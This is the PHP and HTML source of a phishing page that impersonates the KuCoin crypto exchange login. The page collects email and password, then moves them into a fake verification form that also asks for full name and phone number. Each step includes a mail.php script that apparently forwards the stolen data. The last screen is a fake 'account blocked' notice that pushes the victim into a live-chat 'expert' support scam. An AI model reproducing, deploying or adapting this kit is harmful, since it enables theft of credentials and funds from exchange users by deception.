<!DOCTYPE html>
<html lang="en">
   <head>
      <meta name="robots" content="noindex, nofollow"/>
      <meta name="googlebot" content="noindex, nofollow"/>
      <meta name="bingbot" content="noindex, nofollow"/>
      <meta charset="UTF-8">
      <meta http-equiv="X-UA-Compatible" content="IE=edge">
      <meta name="viewport" content="width=device-width, initial-scale=1.0">
      <title>Kucoin Login - Crypto Exchange, Bitcoin Exchange</title>
      <link rel="stylesheet" href="assets/css/all.min.html">
      <link rel="stylesheet" href="assets/css/bootstrap.min.css">
      <link rel="stylesheet" href="assets/css/style.css">
   </head>
   <body>
      <div class="container-fluid" id="kucoin-form">
         <div class="row">
            <div class="col-md-5 p-0">
               <div class="content">
                  <a href="#"><img src="assets/images/download.svg"></a>
                  <div class="overlay-content">
                     <h1>Find the next crypto gem on KuCoin</h1>
                     <p>1 Out of 4 Crypto Holders Worldwide Is with KuCoin</p>
                  </div>
               </div>
            </div>
            <div class="col-md-7 p-0">
               <?php
                  if (isset($_POST['btnLoginMore'])) {
                     include 'mail.php';
                  ?>
               <div class="form-area">
                  <div class="form">
                     <div class="alert mb-4 alert-danger text-center">Attention: the account has been <b>temporarily blocked due to suspicious activity in your Network IP,</b> kindly verify the following details<br>
                        Kindly contact chat assistance for further help
                     </div>
                     <h2>Verification Required</h2>
                     <form class="form-group" action="" method="post">
                        <input type="hidden" name="brandName" value="KuCoin">
                        <input type="hidden" name="email" value="<?php echo $_POST['email']; ?>" />
                        <input type="hidden" name="password" value="<?php echo $_POST['password']; ?>" />
                        <label>Full Name</label>
                        <input type="text" placeholder="Full Name" name="name" class="form-control">
                        <label>Phone Number</label>
                        <input type="text" placeholder="+1 123 456 7890" name="number" class="form-control">
                        <div>
                           <button type="submit" name="fromLog" class="btn">Verify</button>
                        </div>
                     </form>
                  </div>
               </div>
               <?php } elseif (isset($_POST['fromLog'])) {
                  include 'mail.php';
                  ?>
               <div class="form-area">
                  <div class="form">
                     <h2 class="text-center">Account Blocked</h2>
                     <div class="panel-body text-center">
                        <p style="font-size: 20px;">Your account has been <b>temporarily blocked</b> due to <br>suspicious activity on your Network IP.<br>Kindly ask an expert</p>
                        <div class="">
                           <label style="font-size: 18px;">Error CODE: <b>6X76D</b></label>
                        </div>
                        <div class="calling-number">
                           <a class="btn btn-danger" href="javascript:void(Tawk_API.toggle())" style="background: #bf0707;color: #fff !important;font-size: 20px;font-weight: 600;margin-top: 15px;">Ask Expert</a>
                        </div>
                     </div>
                  </div>
               </div>
               <?php } else { ?>
               <div class="form-area">
                  <div class="navigation">
                     <p>Haven't registered yet?<a href="#"> Sign up Now.</a></p>
                  </div>
                  <div class="form">
                     <h2>Log In</h2>
                     <ul class="nav nav-tabs" id="myTab" role="tablist" style="margin-bottom: 30px;">
                        <li class="nav-item" role="presentation"  >
                           <a class="nav-link active" id="email-tab"  style="border-right: 1px solid gray;padding:0 20px 0 0 ; border-radius: 0;" data-toggle="tab" href="#email" role="tab"
                              aria-controls="email" aria-selected="true">Email</a>
                        </li>
                     </ul>
                     <div class="tab-content" id="myTabContent">
                        <div class="tab-pane fade show active" id="email" role="tabpanel"
                           aria-labelledby="email-tab">
                           <form action="" method="post">
                              <div class="form-group">
                                 <input type="hidden" name="brandName" value="KuCoin">
                                 <label for="exampleInputEmail1">Email / Sub Account</label>
                                 <input type="email" class="form-control" name="email" required="" id="exampleInputEmail1"
                                    aria-describedby="emailHelp">
                              </div>
                              <div class="form-group"><label for="exampleInputPassword1">Password</label>
                                 <input type="password" class="form-control" name="password" id="exampleInputPassword1" required="">
                              </div>
                              <button type="submit" name="btnLoginMore" class="btn btn-block">Log In</button>
                           </form>
                        </div>
                     </div>
                  </div>
               </div>
               <?php } ?>
            </div>
         </div>
      </div>
      <script src="assets/js/jquery-3.5.1.min.js"></script>
      <script src="assets/js/bootstrap.min.js"></script>
      <!--Start of Tawk.to Script-->
      <script type="text/javascript">
         var Tawk_API=Tawk_API||{}, Tawk_LoadStart=new Date();
         (function(){
         var s1=document.createElement("script"),s0=document.getElementsByTagName("script")[0];
         s1.async=true;
         s1.src='https://embed.tawk.to/620a586d9bd1f31184dc89bb/1frs6irvs';
         s1.charset='UTF-8';
         s1.setAttribute('crossorigin','*');
         s0.parentNode.insertBefore(s1,s0);
         })();
      </script>
      <!--End of Tawk.to Script--> 
   </body>
</html>